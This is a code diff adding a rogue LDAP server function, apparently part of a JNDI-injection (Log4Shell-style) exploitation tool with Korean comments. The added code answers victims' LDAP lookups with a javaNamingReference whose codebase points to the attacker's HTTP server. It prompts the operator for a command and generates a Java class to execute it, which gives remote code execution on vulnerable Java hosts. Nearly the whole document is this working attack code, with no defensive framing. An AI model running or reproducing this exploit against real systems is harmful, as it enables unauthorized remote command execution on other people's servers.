@@ -1,5 +1,13 @@
+
+from datetime import datetime
+from termcolor import colored
+import socket
+import Utils
+import time
+import Generate
 import os
 import json
+
 
 #ldap response 패킷 serializer class
 class Serializer():
@@ -53,3 +61,55 @@ class LDAPResponse():
 
         SUCCESS_RESPONSE = b"0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00"
         return s.build() + SUCCESS_RESPONSE
+
+
+def OpenLDAPService(host, port, hport):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.bind(('0.0.0.0', port))
+        sock.listen(1)
+
+        while True:
+            conn, addr = sock.accept()
+
+            with conn as c:
+                try:
+                    timestamp = datetime.now().ctime()
+                    print(colored(f"[+] Connecting by {addr[0]}:{addr[1]} ({timestamp})\n", "green"))
+                    c.recv(8096)
+                    c.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")
+                    time.sleep(0.5)
+
+                    query = c.recv(8096)
+                    queryLocation = query[9:9 + query[8:][0]].decode()
+
+                    if not query or len(query) < 10:
+                        print(colored("[-] Connection Suspended", "red"))
+                        return
+
+                    command = Utils.printPrompt("command", "Command : ")
+                    print(colored("[+] Command was sent succefully.\n","green"))
+
+                    className = Utils.randomName(command)
+                    Generate.generateClass(command, className)
+
+                    #reponse 패킷 생성
+                    response = LDAPResponse(queryLocation, {
+                        "javaClassName": className,
+                        "javaCodeBase": f"http://{host}:{hport}/",
+                        "objectClass": "javaNamingReference",
+                        "javaFactory": className
+                    })
+
+                    c.sendall(response.serialize())
+                    time.sleep(0.5)
+                    c.recv(8096)
+
+
+                except Exception as e :
+                    print(e)
+                    print(colored('[!] Unable to exploit the connection.\n', 'red'))
+                finally :
+                    c.close()
+
+if __name__ == "__main__":
+    print("test")
